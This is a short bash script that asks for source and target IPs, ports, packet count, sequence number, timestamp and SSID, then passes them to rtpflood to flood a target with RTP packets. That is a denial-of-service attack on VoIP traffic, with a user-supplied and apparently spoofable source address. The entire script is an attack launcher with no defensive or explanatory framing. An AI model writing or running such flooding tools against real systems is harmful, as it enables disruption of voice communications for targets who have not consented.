#!/bin/bash
read -p "    [!] Enter the source IP: " SOURCE_IP
read -p "    [!] Enter the target IP: " TARGET_IP
read -p "    [!] Enter the source port: " SOURCE_PORT
read -p "    [!] Enter the destination port: " DESTINATION_PORT
read -p "    [!] Enter the packet count: " PACKET_COUNT
read -p "    [!] Enter the sequence number: " SEQUENCE_NUMBER
read -p "    [!] Enter the timestamp: " TIMESTAMP
read -p "    [!] Enter the SSID: " SSID
rtpflood "$SOURCE_IP" "$TARGET_IP" "$SOURCE_PORT" "$DESTINATION_PORT" "$PACKET_COUNT" "$SEQUENCE_NUMBER" "$TIMESTAMP" "$SSID"
